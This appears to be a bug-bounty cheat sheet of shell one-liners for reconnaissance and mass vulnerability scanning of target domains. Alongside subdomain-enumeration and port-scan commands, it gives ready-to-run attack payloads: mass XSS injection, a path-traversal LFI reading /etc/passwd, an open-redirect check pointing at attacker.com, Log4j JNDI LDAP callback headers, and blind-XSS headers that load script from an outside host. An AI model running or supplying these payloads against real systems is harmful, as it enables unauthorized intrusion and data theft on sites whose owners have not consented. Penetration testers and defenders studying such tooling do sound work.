---
title: OneLiners
icon: fas fa-info-circle
order: 3
---

### Mass XSS via wayback machine
+ ``gau http://target.com | uro | bhedak '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not'``<br>
+ ``gau google.com | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)" | uro | bhedak '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not'``


### Mass IPs listing Via Shodan
+ ```shodan search --limit 1000 'http.title:"Dashboard [Jenkins]"' | awk  '{print $1,":"$2}' | sed 's/ //' | httpx -silent | tee /root/Desktop/shodan.txt```


### Subdomain from crt.sh
+ ```curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | tee /root/Desktop/crt.txt```

### wordpress mysql 
+ ```sublist3r -d target.com | httpx -silent -path "/wp-content/mysql.sql" -mc 200 -t 250 -ports 80,443,8080,8443```

### Get all urls from sitemap
+ ``curl -s https://target.com/sitemap.xml | xmllint --format - | grep -e 'loc' | sed -r 's|</?loc>||g'``

### Waybackurls Validators
+ ``waybackurls http://bugcrowd.com | grep "url" | xargs -n 1 curl -s -o /dev/null -w "%{http_code} > %{url_effective}\n" | sort``

### Extract all endpoints from js file
+ ``cat files.txt | grep -aoP "(?<=(\"|\'|`))\/[a-zA-Z0-9?&=\/-#.](?=(\"|\'|`))" | sort -u | tee output.txt``

### OneLiner  http://rapiddns.io Curl for Doamin Recon :
+ ``curl -s "https://rapiddns.io/subdomain/target.com?full=1#result" | grep "<td><a" | cut -d '"' -f 2 | cut -d '/' -f3  | sed 's/?t=cname//g' | sed 's/#result//g' | sed 's/\.$//' | sort -u``

### Check Mass CNAME records
+ ``cat live-domains.txt | while read domains;do dig $domains;done | grep CNAME``

### Mass LFI
+ ``cat hosts | httpx -path ///////../../../etc/passwd -mc 200 -match-string 'root:x:'``

### Open Redirect
+ ``export LHOST="attacker.com"; gau target.com | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'``

### Find JavaScript Files
+ ``assetfinder --subs-only HOST | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Zo-9_]+" | sed -e 's, 'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'):echo -e "\e[1;33m$url\n" "\e[1;32m$vars"; done``

### Get Subdomain from https://riddler.io
+ ``curl -s "https://riddler.io/search/exportcsv?q=pld:target.com" | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u ``

### Get subdomain domain from web archive
+ ``curl -s "http://web.archive.org/cdx/search/cdx?url=*.target.com/*&output=text&fl=original&collapse=urlkey" | sed -e 's_https*://__' -e "s/\/.*//" | sort -u
``
### Get subdomain from certspotter
+ ``curl -s "https://certspotter.com/api/v1/issuances?domain=HOST&include_subdomains=true&expand=dns_names" | jq .[].dns_names | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u ``

### Get subdomain from securitytrails
+ ``curl -s "https://securitytrails.com/list/apex_domain/HOST" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | grep ".HOST" | sort -u``

### Scan juicy ports only
+ ``nmap -sV -p 21,22,80,25,465,587,1617,3000,4848,5985,8022,8080,8282,8484,\ 8585,9200,49153,49154,49202,49203 -v target.com``

### Dependency Confusion check NPM rsgistry
+ ``cat package.json | jq -r '.dependencies + .devDependencies' | cut -d : -f 1 | tr -d '"|}|{' | sort -u | tr -s "     " | sort -u | xargs -n1 -I{} echo "https://registry.npmjs.org/{}" | grep -v "@" | httpx -status-code -silent -content-length -mc 404``

### Heartbleed vulnerability
+ `` cat list.txt | while read line ; do echo "QUIT" | openssl s_client -connect $line:443 2>&1 | grep 'server extension "heartbeat" (id=15)' || echo $line: safe; done ``

### Log4j via httpx 
+ `` cat targets.txt | httpx -H "X-Api-Version: \${jndi:ldap://<ip><port>}" -H "User-Agent: \${jndi:ldap://<ip><port>}" -H "Referer: \${jndi:ldap://<ip><port>}"``

### mass blind xss
+ ``cat targets.txt| httpx -H "User-Agent: \"<script src=https://js.rip/0xmaruf></script>" -H "Host: \"<script src=https://js.rip/0xmaruf></script>" -H "Referer: \"<script src=https://js.rip/0xmaruf></script>" -H "Origin: \"<script src=https://js.rip/0xmaruf></script>"
``

### Paramspider and kxss oneliners
+ ``for URL in $(</home/kali/Desktop/subdomains.txt); do (python3 paramspider.py -d "${URL}");
done``

#Merge all txt files to one txt and run it on kxss
``cat * | sort -u | tee merged.txt | kxss``
